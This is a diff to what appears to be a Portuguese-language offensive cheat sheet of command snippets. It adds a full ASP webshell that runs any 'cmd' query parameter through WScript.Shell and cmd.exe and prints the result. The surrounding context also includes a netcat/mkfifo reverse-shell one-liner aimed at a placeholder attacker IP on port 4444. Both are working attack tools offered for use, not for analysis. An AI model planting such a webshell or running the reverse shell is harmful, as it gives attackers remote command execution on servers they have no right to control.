@@ -129,6 +129,41 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 	Response.Write getCommandOutput
 	%>
 
+ 	<%
+	Dim cmd, output
+	cmd = Request.QueryString("cmd")
+	
+	If cmd <> "" Then
+	    On Error Resume Next
+	    Set oS = Server.CreateObject("WSCRIPT.SHELL")
+	    Set objCmdExec = oS.exec("cmd.exe /c " & cmd)
+	    output = objCmdExec.StdOut.ReadAll()
+	    
+	    If Err.Number <> 0 Then
+	        output = "Erro: " & Err.Description
+	    End If
+	    
+	    Response.Write Server.HTMLEncode(output)
+	    Response.End
+	End If
+	%>
+	
+	<html>
+	<head>
+	<title>Webshell ASP</title>
+	</head>
+	<body>
+	<form method="GET">
+	Comando: <input type="text" name="cmd" size="50" value="<%= Server.HTMLEncode(cmd) %>">
+	<input type="submit" value="Executar">
+	</form>
+	<pre>
+	<% If output <> "" Then Response.Write Server.HTMLEncode(output) %>
+	</pre>
+	</body>
+	</html>
+
+
 .
 
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f
